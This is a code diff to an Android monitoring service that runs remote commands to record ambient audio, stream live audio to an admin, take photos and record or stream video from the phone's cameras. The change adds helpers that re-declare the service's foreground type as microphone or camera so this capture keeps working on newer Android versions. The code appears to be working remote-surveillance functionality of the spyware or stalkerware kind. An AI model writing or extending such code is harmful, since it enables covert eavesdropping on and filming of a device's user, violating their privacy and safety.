@@ -140,19 +140,44 @@ class MonitoringForegroundService : Service() {
         }
     }
 
+    private fun upgradeMicType() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+            hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
+            runCatching {
+                startForeground(NOTIF_ID, buildNotification(),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+            }.onFailure { Log.e(TAG, "upgradeMicType failed: $it") }
+        }
+    }
+
+    private fun upgradeCameraType() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+            hasPermission(android.Manifest.permission.CAMERA)) {
+            runCatching {
+                startForeground(NOTIF_ID, buildNotification(),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
+            }.onFailure { Log.e(TAG, "upgradeCameraType failed: $it") }
+        }
+    }
+
     private fun handleCommand(commandType: String, params: JsonObject, commandId: Int) {
         scope.launch {
             runCatching {
                 when (commandType) {
                     "start_audio_recording" -> {
-                        if (hasPermission(android.Manifest.permission.RECORD_AUDIO))
+                        if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
+                            upgradeMicType()
                             audioMonitor.startAmbientRecording()
+                        }
                     }
                     "stop_audio_recording" -> audioMonitor.stopAmbientRecording { file, duration ->
                         scope.launch { audioMonitor.uploadAmbientRecording(file, duration) }
                     }
                     "start_live_audio" -> {
                         if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
+                            upgradeMicType()
                             val adminId = params.get("admin_id")?.asInt
                             audioMonitor.startLiveAudio(adminId)
                         }
@@ -161,12 +186,14 @@ class MonitoringForegroundService : Service() {
 
                     "take_photo" -> {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
+                            upgradeCameraType()
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.takePhoto(front, commandId)
                         }
                     }
                     "start_video_recording" -> {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
+                            upgradeCameraType()
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.startVideoRecording(front)
                         }
@@ -176,6 +203,7 @@ class MonitoringForegroundService : Service() {
                     }
                     "start_live_video" -> {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
+                            upgradeCameraType()
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.startVideoRecording(front)
                         }
